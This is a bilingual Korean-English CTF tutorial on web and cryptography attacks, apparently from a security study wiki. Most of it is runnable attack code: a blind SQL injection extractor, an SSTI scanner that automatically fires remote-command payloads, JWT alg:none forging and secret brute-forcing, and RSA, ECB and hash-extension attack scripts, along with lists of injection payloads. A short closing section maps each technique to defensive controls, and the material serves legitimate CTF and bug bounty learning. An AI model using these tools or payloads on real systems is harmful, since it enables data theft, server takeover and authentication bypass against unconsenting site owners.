> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# Web과 Crypto CTF 기법

Web CTF는 SQLi 자동화, SSTI, JWT 공격, 역직렬화 취약점을 다루고, Crypto CTF는 RSA 취약 키 분석과 블록 암호 모드 공격을 다룬다.

## 0. 초보자를 위한 개념 이해

### Web과 Crypto CTF란?

Web CTF는 웹사이트나 API 서버의 취약점을 찾아 플래그를 획득하는 분야다. SQL 인젝션, XSS, 인증 우회 등 실제 웹 해킹 기술을 사용한다. Crypto CTF는 잘못 구현된 암호화 알고리즘의 수학적 약점을 찾아 원문이나 키를 복원하는 분야로, RSA, AES, 해시 함수 등을 다룬다.

**왜 배우는가:**
```
Web CTF → 버그 바운티 직결:

  CTF Web 기술           실제 버그 바운티 적용
  ──────────────────────────────────────────
  SQL Injection     →  DB 데이터 탈취 취약점
  SSTI              →  서버 코드 실행 (RCE)
  JWT 위조          →  인증 우회, 권한 상승
  SSRF              →  내부 서비스 접근

Crypto CTF → 암호화 구현 감사:

  취약한 RSA (작은 e)   →  수학으로 원문 복원 가능
  ECB 모드 AES         →  패턴 분석으로 평문 추론
  Padding Oracle       →  암호문 변조로 평문 복호화
```

### 핵심 개념 정리

```
Web CTF 필수 지식:

SQL Injection
  - 입력값에 SQL 코드를 삽입해 DB 쿼리 조작
  - 예: username=' OR '1'='1 → 로그인 우회
  - Blind SQLi: 참/거짓 응답으로 데이터 한 비트씩 추출

SSTI (Server-Side Template Injection)
  - 템플릿 엔진(Jinja2, Twig 등)에 코드 삽입
  - 예: {{7*7}} → 49 출력 시 취약
  - 심각도: 서버 명령 실행(RCE) 가능

JWT (JSON Web Token) 공격
  - alg=none: 서명 검증 비활성화 트릭
  - HS256 → RS256 혼동 공격
  - 약한 시크릿으로 서명 위조

Crypto CTF 필수 지식:

RSA 취약점
  - 작은 공개 지수(e=3): 암호문³ = 평문³ (모듈러 없이)
  - 동일 n, 다른 e: 중국인의 나머지 정리(CRT)로 복원
  - n 인수분해: p, q가 너무 가까우면 Fermat 인수분해 가능
```

### 필요한 도구 및 환경
- **Burp Suite Community**: 웹 요청 인터셉트·수정
- **sqlmap**: `sqlmap -u "http://..." --dbs` — SQLi 자동 탐지
- **jwt.io**: JWT 디코딩·조작 온라인 도구
- **pycryptodome**: `pip install pycryptodome` — Python 암호화 라이브러리
- **SageMath**: 수론 기반 Crypto CTF 풀이 (sagecell.sagemath.org 온라인 사용 가능)

### 기초 실습 예제
```python
#!/usr/bin/env python3
"""
Web & Crypto CTF 기초 실습:
1. SQL Injection 페이로드 생성기
2. RSA 취약 구현 감지기
"""
import math


# ── 1. SQL Injection 페이로드 모음 ──────────────────────────────
def get_sqli_payloads() -> dict[str, list[str]]:
    """CTF/웹 페네트레이션에서 자주 쓰는 SQLi 페이로드 모음"""
    return {
        "로그인_우회": [
            "' OR '1'='1' --",
            "' OR 1=1 --",
            "admin'--",
            "' OR 'x'='x",
        ],
        "UNION_기반_추출": [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT table_name,NULL FROM information_schema.tables--",
        ],
        "블라인드_불린_기반": [
            "' AND 1=1--",    # 참 → 정상 응답
            "' AND 1=2--",    # 거짓 → 오류/빈 응답
            "' AND (SELECT COUNT(*) FROM users)>0--",
        ],
        "시간_기반": [
            "'; WAITFOR DELAY '0:0:5'--",   # MSSQL
            "'; SELECT SLEEP(5)--",          # MySQL
        ],
    }


# ── 2. RSA 취약점 감지기 ──────────────────────────────────────
def check_rsa_vulnerability(n: int, e: int, c: int | None = None) -> dict:
    """
    RSA 공개키 파라미터에서 알려진 취약점을 감지한다.

    Args:
        n: 공개 모듈러스
        e: 공개 지수
        c: 암호문 (선택)
    """
    findings = []

    # 작은 공개 지수 확인
    if e == 3:
        findings.append("e=3: 암호문의 세제곱근이 평문일 수 있음 (small e attack)")
        if c is not None:
            # e=3이고 평문^3 < n이면 모듈러 없이 세제곱근 계산 가능
            root = round(c ** (1/3))
            if root ** 3 == c:
                findings.append(f"  [취약!] 평문 = {root}")

    # Fermat 인수분해 (p, q가 가까울 때)
    a = math.isqrt(n) + 1
    b_squared = a * a - n
    b = math.isqrt(b_squared)
    if b * b == b_squared:
        p, q = a - b, a + b
        findings.append(f"Fermat 인수분해 성공: p={p}, q={q}")

    # 작은 n (학습용 문제에서 자주 등장)
    if n.bit_length() < 512:
        findings.append(f"n 크기 불충분: {n.bit_length()}비트 (최소 2048비트 권장)")

    return {
        "n_bits": n.bit_length(),
        "e": e,
        "취약점": findings if findings else ["명백한 취약점 없음"],
    }


if __name__ == "__main__":
    print("=== SQL Injection 페이로드 ===")
    payloads = get_sqli_payloads()
    for category, items in payloads.items():
        print(f"\n[{category}]")
        for p in items[:2]:
            print(f"  {p}")

    print("\n=== RSA 취약점 분석 ===")
    # 교육용 작은 RSA 예제
    result = check_rsa_vulnerability(
        n=3233,    # 61 * 53 (실제는 2048비트 이상 사용)
        e=3,
        c=27,      # 3^3 = 27 → 평문=3
    )
    import json
    print(json.dumps(result, ensure_ascii=False, indent=2))
```

---

## 1. Web CTF 기법

### 1.1 SQLi 블라인드 자동화

```python
#!/usr/bin/env python3
"""블라인드 SQLi 자동화 CLI (바이너리/시간 기반)"""

import argparse
import string
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Callable
import requests


session = requests.Session()
session.headers.update({'User-Agent': 'Mozilla/5.0'})


def boolean_blind_extract(
    url: str,
    param: str,
    true_indicator: str,
    charset: str = string.printable[:95],
    max_len: int = 64,
) -> str:
    """불린 기반 블라인드 SQLi — 이진 탐색으로 문자 추출"""

    def check(payload: str) -> bool:
        r = session.get(url, params={param: payload}, timeout=10)
        return true_indicator in r.text

    # 길이 탐색
    length = 0
    for i in range(1, max_len + 1):
        payload = f"' AND LENGTH(({extract_query}))={i}-- -"
        if check(payload):
            length = i
            break
    
    if not length:
        return ""
    
    # 문자 추출 (이진 탐색)
    result = ""
    for pos in range(1, length + 1):
        lo, hi = 32, 127
        while lo < hi:
            mid = (lo + hi) // 2
            payload = f"' AND ASCII(SUBSTR(({extract_query}),{pos},1))>{mid}-- -"
            if check(payload):
                lo = mid + 1
            else:
                hi = mid
        result += chr(lo)
        sys.stdout.write(f"\r[*] 추출 중: {result}")
        sys.stdout.flush()

    print()
    return result

extract_query = "SELECT database()"  # 추출할 쿼리


def time_based_extract(
    url: str,
    param: str,
    query: str,
    delay: float = 3.0,
    charset: str = string.ascii_letters + string.digits + '_{}',
    max_len: int = 64,
) -> str:
    """시간 기반 블라인드 SQLi"""

    def check_char(pos: int, char_ord: int) -> bool:
        payload = (
            f"' AND IF(ASCII(SUBSTR(({query}),{pos},1))={char_ord},"
            f"SLEEP({delay}),0)-- -"
        )
        start = time.time()
        try:
            session.get(url, params={param: payload}, timeout=delay + 2)
        except requests.exceptions.Timeout:
            return True  # 타임아웃 = True
        elapsed = time.time() - start
        return elapsed >= delay * 0.8

    result = []
    for pos in range(1, max_len + 1):
        found = False
        for c in charset:
            if check_char(pos, ord(c)):
                result.append(c)
                sys.stdout.write(f"\r[*] {pos}: {''.join(result)}")
                sys.stdout.flush()
                found = True
                break
        if not found:
            break

    print()
    return ''.join(result)


def main_sqli() -> None:
    parser = argparse.ArgumentParser(description="블라인드 SQLi 자동화")
    parser.add_argument("url")
    parser.add_argument("--param", required=True, help="취약한 파라미터")
    parser.add_argument("--indicator", help="True 조건 지시자 (불린 기반)")
    parser.add_argument("--query", default="SELECT database()", help="추출할 SQL 쿼리")
    parser.add_argument("--type", choices=["boolean", "time"], default="time")
    parser.add_argument("--delay", type=float, default=3.0)
    args = parser.parse_args()

    if args.type == "time":
        result = time_based_extract(args.url, args.param, args.query, args.delay)
    else:
        if not args.indicator:
            print("[!] 불린 기반은 --indicator 필요")
            sys.exit(1)
        result = boolean_blind_extract(args.url, args.param, args.indicator)

    print(f"\n[+] 결과: {result}")


if __name__ == "__main__":
    main_sqli()
```

---

### 1.2 SSTI (서버 사이드 템플릿 인젝션)

```
엔진별 탐지 및 페이로드:

Jinja2 (Python/Flask):
  탐지: {{7*7}} → 49
  OS 실행: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
  클래스 탐색: {{''.__class__.__mro__[1].__subclasses__()}}

Twig (PHP):
  탐지: {{7*7}} → 49
  OS 실행: {{['id']|filter('system')}}

Freemarker (Java):
  탐지: ${7*7} → 49
  OS 실행: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

Smarty (PHP):
  탐지: {7*7} → 49
  OS 실행: {php}echo `id`;{/php}

Velocity (Java):
  탐지: #set($x=7*7)$x → 49
  OS 실행: #set($r=$Runtime.exec("id"))
```

```python
#!/usr/bin/env python3
"""SSTI 템플릿 엔진 탐지 및 페이로드 생성"""

import requests
import argparse

SSTI_PROBES = {
    "Jinja2": ("{{7*'7'}}", "7777777"),
    "Twig":   ("{{7*'7'}}", "49"),
    "Smarty": ("{7*7}", "49"),
    "Freemarker": ("${7*7}", "49"),
    "Mako": ("${7*7}", "49"),
}

SSTI_PAYLOADS = {
    "Jinja2": [
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}",
    ],
    "Twig": [
        "{{['id', '0']|sort('passthru')}}",
        "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
    ],
}


def detect_ssti(url: str, param: str) -> str | None:
    for engine, (probe, expected) in SSTI_PROBES.items():
        try:
            r = requests.get(url, params={param: probe}, timeout=5)
            if expected in r.text:
                print(f"[+] SSTI 탐지: {engine} (probe: {probe})")
                return engine
        except Exception:
            continue
    return None


def run_ssti(url: str, param: str) -> None:
    engine = detect_ssti(url, param)
    if not engine:
        print("[-] SSTI 미탐지")
        return

    payloads = SSTI_PAYLOADS.get(engine, [])
    for payload in payloads:
        try:
            r = requests.get(url, params={param: payload}, timeout=10)
            if "root" in r.text or "uid=" in r.text:
                print(f"[+] RCE 성공!\n{r.text[:200]}")
                return
        except Exception:
            continue


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SSTI 탐지·익스플로잇")
    parser.add_argument("url"), parser.add_argument("--param", default="name")
    args = parser.parse_args()
    run_ssti(args.url, args.param)
```

---

### 1.3 JWT 공격 기법

```python
#!/usr/bin/env python3
"""JWT CTF 공격 도구"""

import argparse
import base64
import hashlib
import hmac
import json
import sys


def base64url_decode(s: str) -> bytes:
    s += '=' * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)


def base64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()


def parse_jwt(token: str) -> tuple[dict, dict, bytes]:
    parts = token.split('.')
    if len(parts) != 3:
        raise ValueError("Invalid JWT format")
    header = json.loads(base64url_decode(parts[0]))
    payload = json.loads(base64url_decode(parts[1]))
    sig = base64url_decode(parts[2])
    return header, payload, sig


def attack_none_alg(token: str, new_payload: dict | None = None) -> str:
    """alg:none 공격 — 서명 없는 토큰"""
    header, payload, _ = parse_jwt(token)
    header['alg'] = 'none'
    if new_payload:
        payload.update(new_payload)

    new_header = base64url_encode(json.dumps(header, separators=(',', ':')).encode())
    new_payload_b = base64url_encode(json.dumps(payload, separators=(',', ':')).encode())
    return f"{new_header}.{new_payload_b}."  # 빈 서명


def attack_hs256_with_pubkey(token: str, public_key: str) -> str:
    """RS256→HS256 혼동 공격: 공개키로 HMAC 서명"""
    header, payload, _ = parse_jwt(token)
    header['alg'] = 'HS256'

    header_b = base64url_encode(json.dumps(header, separators=(',', ':')).encode())
    payload_b = base64url_encode(json.dumps(payload, separators=(',', ':')).encode())

    signing_input = f"{header_b}.{payload_b}".encode()
    sig = hmac.new(public_key.encode(), signing_input, hashlib.sha256).digest()
    return f"{header_b}.{payload_b}.{base64url_encode(sig)}"


def brute_force_hs256(token: str, wordlist_path: str) -> str | None:
    """HS256 비밀키 브루트포스"""
    header, payload, sig = parse_jwt(token)
    parts = token.split('.')
    signing_input = f"{parts[0]}.{parts[1]}".encode()

    try:
        with open(wordlist_path, 'rb') as f:
            for line in f:
                key = line.strip()
                computed = hmac.new(key, signing_input, hashlib.sha256).digest()
                if computed == sig:
                    return key.decode('utf-8', errors='replace')
    except FileNotFoundError:
        print(f"[!] 워드리스트 없음: {wordlist_path}", file=sys.stderr)

    return None


def main() -> None:
    parser = argparse.ArgumentParser(description="JWT CTF 공격 도구")
    sub = parser.add_subparsers(dest="command", required=True)

    parse_p = sub.add_parser("parse", help="JWT 파싱")
    parse_p.add_argument("token")

    none_p = sub.add_parser("none", help="alg:none 공격")
    none_p.add_argument("token")
    none_p.add_argument("--claim", nargs=2, metavar=("KEY", "VALUE"), help="페이로드 변경")

    brute_p = sub.add_parser("brute", help="HS256 브루트포스")
    brute_p.add_argument("token")
    brute_p.add_argument("--wordlist", default="/usr/share/wordlists/rockyou.txt")

    args = parser.parse_args()

    if args.command == "parse":
        h, p, s = parse_jwt(args.token)
        print(f"Header: {json.dumps(h, indent=2)}")
        print(f"Payload: {json.dumps(p, indent=2)}")

    elif args.command == "none":
        new_payload = None
        if args.claim:
            new_payload = {args.claim[0]: args.claim[1]}
        result = attack_none_alg(args.token, new_payload)
        print(f"[+] 변조된 토큰:\n{result}")

    elif args.command == "brute":
        key = brute_force_hs256(args.token, args.wordlist)
        if key:
            print(f"[+] 시크릿 키 발견: {key}")
        else:
            print("[-] 키를 찾지 못함")


if __name__ == "__main__":
    main()
```

---

## 2. Crypto CTF 기법

### 2.1 RSA CTF 솔버 CLI

```python
#!/usr/bin/env python3
"""RSA CTF 취약점 분석·풀이 CLI"""

import argparse
import sys

try:
    from Crypto.PublicKey import RSA
    from Crypto.Util.number import long_to_bytes, bytes_to_long, inverse
    import gmpy2
except ImportError:
    print("[!] pip install pycryptodome gmpy2", file=sys.stderr)
    sys.exit(1)


def factor_small_n(n: int) -> tuple[int, int] | None:
    """작은 N 인수분해 (trial division)"""
    if n < 2:
        return None
    for p in range(2, min(1000000, n)):
        if n % p == 0:
            return (p, n // p)
    return None


def wiener_attack(e: int, n: int) -> int | None:
    """Wiener's Attack: 작은 d (d < N^0.25) 복구"""
    from fractions import Fraction

    def continued_fraction(e: int, n: int):
        while n:
            yield e // n
            e, n = n, e % n

    def convergents(cf):
        n0, n1, d0, d1 = 1, 0, 0, 1
        for q in cf:
            n0, n1 = n1, q * n1 + n0
            d0, d1 = d1, q * d1 + d0
            yield (n1, d1)

    for (k, d) in convergents(continued_fraction(e, n)):
        if k == 0:
            continue
        if (e * d - 1) % k == 0:
            phi = (e * d - 1) // k
            b = n - phi + 1
            discriminant = b * b - 4 * n
            if discriminant >= 0:
                sqrt_d, exact = gmpy2.isqrt_rem(discriminant)
                if exact == 0:
                    p = (b + int(sqrt_d)) // 2
                    q = (b - int(sqrt_d)) // 2
                    if p * q == n:
                        return d
    return None


def low_exponent_attack(c: int, e: int, n: int) -> bytes | None:
    """작은 e (e=3) 공격: e-th root"""
    m_root, exact = gmpy2.iroot(c, e)
    if exact:
        return long_to_bytes(int(m_root))

    # c + k*n의 e-th root 탐색
    for k in range(1, 10000):
        m_root, exact = gmpy2.iroot(c + k * n, e)
        if exact:
            return long_to_bytes(int(m_root))

    return None


def common_modulus_attack(c1: int, c2: int, e1: int, e2: int, n: int) -> bytes | None:
    """공통 모듈러스 공격: 같은 n으로 다른 e로 암호화"""
    from math import gcd

    if gcd(e1, e2) != 1:
        return None

    _, s1, s2 = gmpy2.gcdext(e1, e2)
    s1, s2 = int(s1), int(s2)

    if s1 < 0:
        c1 = int(gmpy2.invert(c1, n))
        s1 = -s1
    if s2 < 0:
        c2 = int(gmpy2.invert(c2, n))
        s2 = -s2

    m = pow(c1, s1, n) * pow(c2, s2, n) % n
    return long_to_bytes(m)


def decrypt_rsa(p: int, q: int, e: int, c: int) -> bytes:
    """p, q, e, c로 복호화"""
    n = p * q
    phi = (p - 1) * (q - 1)
    d = inverse(e, phi)
    m = pow(c, d, n)
    return long_to_bytes(m)


def main() -> None:
    parser = argparse.ArgumentParser(description="RSA CTF 솔버")
    sub = parser.add_subparsers(dest="command", required=True)

    # 키 파싱
    parse_p = sub.add_parser("parse", help="RSA 키 파일 파싱")
    parse_p.add_argument("keyfile", help="PEM 키 파일")

    # Wiener 공격
    w_p = sub.add_parser("wiener", help="Wiener's attack (작은 d)")
    w_p.add_argument("--e", type=int, required=True)
    w_p.add_argument("--n", type=int, required=True)

    # 작은 e 공격
    le_p = sub.add_parser("low-e", help="Low exponent attack (e=3)")
    le_p.add_argument("--c", type=int, required=True)
    le_p.add_argument("--e", type=int, default=3)
    le_p.add_argument("--n", type=int, required=True)

    # 직접 복호화
    dec_p = sub.add_parser("decrypt", help="p,q,e,c로 복호화")
    dec_p.add_argument("--p", type=int, required=True)
    dec_p.add_argument("--q", type=int, required=True)
    dec_p.add_argument("--e", type=int, default=65537)
    dec_p.add_argument("--c", type=int, required=True)

    args = parser.parse_args()

    if args.command == "parse":
        with open(args.keyfile) as f:
            key = RSA.import_key(f.read())
        print(f"n = {key.n}")
        print(f"e = {key.e}")
        if hasattr(key, 'd') and key.d:
            print(f"d = {key.d}")
        # FactorDB 조회 힌트
        print(f"\n[힌트] FactorDB: http://factordb.com/index.php?query={key.n}")

    elif args.command == "wiener":
        d = wiener_attack(args.e, args.n)
        if d:
            print(f"[+] d = {d}")
        else:
            print("[-] Wiener 공격 실패")

    elif args.command == "low-e":
        result = low_exponent_attack(args.c, args.e, args.n)
        if result:
            print(f"[+] m = {result}")
            print(f"    텍스트: {result.decode('latin-1', errors='replace')}")
        else:
            print("[-] 실패")

    elif args.command == "decrypt":
        result = decrypt_rsa(args.p, args.q, args.e, args.c)
        print(f"[+] 복호화: {result}")
        print(f"    텍스트: {result.decode('latin-1', errors='replace')}")


if __name__ == "__main__":
    main()
```

---

### 2.2 AES ECB 블록 조작

```python
#!/usr/bin/env python3
"""AES-ECB Byte-at-a-Time 공격"""

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os


# 실제 CTF에서는 서버로 전송하는 함수로 교체
def oracle(plaintext: bytes) -> bytes:
    """ECB 암호화 오라클 (CTF 서버 시뮬레이션)"""
    secret = b"FLAG{ecb_is_bad}"
    key = b"A" * 16  # 서버의 고정 키
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.encrypt(pad(plaintext + secret, 16))


def detect_block_size() -> int:
    base_len = len(oracle(b""))
    for i in range(1, 64):
        new_len = len(oracle(b"A" * i))
        if new_len > base_len:
            return new_len - base_len
    return 16


def byte_at_a_time_ecb() -> bytes:
    """ECB Byte-at-a-Time 공격으로 secret 복구"""
    block_size = detect_block_size()
    print(f"[*] 블록 크기: {block_size}")

    secret_len = len(oracle(b"")) - block_size
    secret = b""

    for i in range(secret_len):
        # 패딩: 알아낼 바이트가 블록 끝에 오도록
        pad_len = block_size - (i % block_size) - 1
        known_block = oracle(b"A" * pad_len)[:block_size * (i // block_size + 1)]

        # 모든 가능한 바이트 브루트포스
        for byte in range(256):
            test = b"A" * pad_len + secret + bytes([byte])
            if oracle(test)[:len(known_block)] == known_block:
                secret += bytes([byte])
                sys.stdout.write(f"\r[*] 복구 중: {secret.decode('latin-1', errors='replace')}")
                sys.stdout.flush()
                break

    print()
    return secret


import sys
if __name__ == "__main__":
    result = byte_at_a_time_ecb()
    print(f"\n[+] 복구된 secret: {result}")
```

---

### 2.3 Hash Length Extension 공격

```python
#!/usr/bin/env python3
"""Hash Length Extension Attack (SHA-256/SHA-512)"""

try:
    import hlextend  # pip install hlextend
except ImportError:
    print("[!] pip install hlextend")
    import sys; sys.exit(1)


def hash_length_extension(
    known_mac: str, known_data: bytes,
    append_data: bytes, key_len: int,
    algorithm: str = "sha256"
) -> tuple[str, bytes]:
    """
    서버: MAC = SHA256(secret_key + data)
    공격: SHA256(secret_key + data + padding + append_data) 예측
    """
    sha = hlextend.new(algorithm)
    new_mac = sha.extend(append_data, known_data, key_len, known_mac)
    new_message = sha.padding(known_data, key_len) + append_data
    return new_mac, new_message


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--mac", required=True, help="알려진 MAC (hex)")
    parser.add_argument("--data", required=True, help="알려진 데이터")
    parser.add_argument("--append", required=True, help="추가할 데이터")
    parser.add_argument("--key-len", type=int, required=True)
    parser.add_argument("--algo", default="sha256")
    args = parser.parse_args()

    new_mac, new_msg = hash_length_extension(
        args.mac,
        args.data.encode(),
        args.append.encode(),
        args.key_len,
        args.algo,
    )
    print(f"[+] 새 MAC: {new_mac}")
    print(f"[+] 새 메시지 (hex): {new_msg.hex()}")
    print(f"[+] URL 인코딩: {new_msg}")
```

---

<!-- detect-validate-46 -->
## Web/Crypto 기법의 실전 통제 매핑과 검증

Web/Crypto CTF는 *SQLi·SSTI·디시리얼라이즈·약한 암호·오라클*로 챌린지를 푼다. 실전 가치는 **각 기법이 어떤 통제로 막히고 그 통제가 실제로 작동하는가**에 있다. 실습은 **CTF/소유 앱**에서만.

### 기법 → 노리는 약점 → 실전 1차 통제 → 탐지/검증 신호

| 기법 | 노리는 약점 | 실전 1차 통제 | 탐지/검증 신호 |
|---|---|---|---|
| SQLi | 문자열 쿼리 | 파라미터화 | 쿼리에 입력 직삽 |
| SSTI | 템플릿 입력 | 샌드박스·이스케이프 | {{ }} 평가 |
| 디시리얼라이즈 | 신뢰 역직렬화 | 허용목록·서명 | 가젯 체인 호출 |
| 약한 암호/오라클 | 잘못된 모드/패딩 | AEAD·상수시간 | 패딩 오라클 응답차 |

### 검증 (직접 확인)

```bash
# 1) 소유 앱이 파라미터화 쿼리를 쓰는지(실전 통제) — 문자열 연결 쿼리가 SQLi 표면 신호
grep -rnE '(execute|query)\(.*(\+|%|f").*(SELECT|INSERT|WHERE)' app/ 2>/dev/null | head
# 2) 패딩 오라클 검증 — 변조 암호문에 응답/타이밍 차이가 있으면 취약 신호(소유 엔드포인트)
for pad in 00 01 ff; do curl -s -o /dev/null -w "%{http_code} %{time_total}\n" "https://app.internal/dec?ct=DEADBEEF$pad"; done
```

> Web/Crypto 학습은 *통제가 기법을 막는가*다 — "플래그를 땄다"와 "파라미터화/AEAD가 그 인젝션·오라클을 막는다"는 다르다. CTF/소유 앱에서 직접 검증한다([[05_Web_Hacking]], [[16_Cryptography]], [[12_Bug_Bounty]]).

---

<a name="english"></a>

# Web and Crypto CTF Techniques

Web CTF covers blind SQLi automation, SSTI, JWT attacks, and deserialization vulnerabilities. Crypto CTF covers RSA weak key analysis and block cipher mode attacks.

---

## 1. Web CTF Techniques

### 1.1 Blind SQLi Automation

The Python script above automates both boolean-based and time-based blind SQL injection using binary search for efficient character extraction. Key features:
- **Boolean-based**: Uses a true-condition indicator string to infer characters via binary search
- **Time-based**: Uses `SLEEP()` delays with configurable threshold to infer characters character-by-character

Usage:
```bash
# Time-based
python3 sqli.py http://target.com --param id --query "SELECT database()" --type time

# Boolean-based
python3 sqli.py http://target.com --param id --indicator "Welcome" --type boolean
```

---

### 1.2 SSTI (Server-Side Template Injection)

```
Detection and payloads by engine:

Jinja2 (Python/Flask):
  Detection: {{7*7}} → 49
  OS execution: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
  Class enumeration: {{''.__class__.__mro__[1].__subclasses__()}}

Twig (PHP):
  Detection: {{7*7}} → 49
  OS execution: {{['id']|filter('system')}}

Freemarker (Java):
  Detection: ${7*7} → 49
  OS execution: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

Smarty (PHP):
  Detection: {7*7} → 49
  OS execution: {php}echo `id`;{/php}

Velocity (Java):
  Detection: #set($x=7*7)$x → 49
  OS execution: #set($r=$Runtime.exec("id"))
```

The SSTI detection script probes multiple engines and automatically attempts RCE payloads once the engine is identified.

---

### 1.3 JWT Attack Techniques

Three main JWT attack vectors:

1. **alg:none attack** — Change the algorithm to "none" and strip the signature
2. **RS256→HS256 confusion** — Sign with the server's public key using HMAC
3. **HS256 brute-force** — Dictionary attack against the HMAC secret key

```bash
# Parse a JWT
python3 jwt_attack.py parse <token>

# alg:none attack with role escalation
python3 jwt_attack.py none <token> --claim role admin

# Brute-force the secret
python3 jwt_attack.py brute <token> --wordlist /usr/share/wordlists/rockyou.txt
```

---

## 2. Crypto CTF Techniques

### 2.1 RSA CTF Solver CLI

Key attack implementations:
- **Small N factorization** — Trial division for weak moduli
- **Wiener's Attack** — Recovers small private exponent d via continued fractions
- **Low exponent attack** — e-th root attack for small public exponents (e.g., e=3)
- **Common modulus attack** — Recovers plaintext when the same message is encrypted with different exponents sharing the same modulus

```bash
# Parse RSA key and get FactorDB hint
python3 rsa_solver.py parse key.pem

# Wiener's attack
python3 rsa_solver.py wiener --e <e> --n <n>

# Low exponent (e=3) attack
python3 rsa_solver.py low-e --c <ciphertext> --n <n>

# Direct decryption with known factors
python3 rsa_solver.py decrypt --p <p> --q <q> --e 65537 --c <ciphertext>
```

---

### 2.2 AES ECB Block Manipulation

The AES-ECB byte-at-a-time attack recovers a secret by:
1. Detecting block size by monitoring ciphertext length changes
2. Controlling input length to position unknown bytes at block boundaries
3. Brute-forcing each byte by comparing ciphertext blocks

---

### 2.3 Hash Length Extension Attack

The attack exploits the Merkle-Damgard construction of SHA-256/SHA-512:
- **Target**: MAC = SHA256(secret_key + data)
- **Goal**: Forge MAC = SHA256(secret_key + data + padding + appended_data)
- **Requirement**: Only the MAC value, original data, and key length are needed

```bash
python3 hash_ext.py --mac <known_mac_hex> --data "original_data" \
    --append "&admin=true" --key-len 16 --algo sha256
```

<!-- detect-validate-46 -->
## Mapping Web/Crypto Techniques to Real Controls and Validation

Web/Crypto CTF solves challenges via *SQLi, SSTI, deserialization, weak crypto, and oracles*. The real-world value lies in **which control stops each technique and whether it actually works**. Practice only on **CTF/owned apps**.

### Technique -> Targeted weakness -> Real-world primary control -> Detection/validation signal

| Technique | Targeted weakness | Real-world primary control | Detection/validation signal |
|---|---|---|---|
| SQLi | String query | Parameterization | Input concatenated into query |
| SSTI | Template input | Sandbox, escape | {{ }} evaluated |
| Deserialization | Trusted deserialize | Allowlist, signing | Gadget chain invoked |
| Weak crypto/oracle | Wrong mode/padding | AEAD, constant-time | Padding-oracle response diff |

### Validation (verify directly)

```bash
# 1) Whether the owned app uses parameterized queries (real-world control) — string-concatenated queries signal a SQLi surface
grep -rnE '(execute|query)\(.*(\+|%|f").*(SELECT|INSERT|WHERE)' app/ 2>/dev/null | head
# 2) Padding-oracle check — a response/timing difference on tampered ciphertext signals a vuln (owned endpoint)
for pad in 00 01 ff; do curl -s -o /dev/null -w "%{http_code} %{time_total}\n" "https://app.internal/dec?ct=DEADBEEF$pad"; done
```

> Web/Crypto learning is *whether the control stops the technique* -- "I got the flag" differs from "parameterization/AEAD stops that injection/oracle". Validate on CTF/owned apps directly ([[05_Web_Hacking]], [[16_Cryptography]], [[12_Bug_Bounty]]).
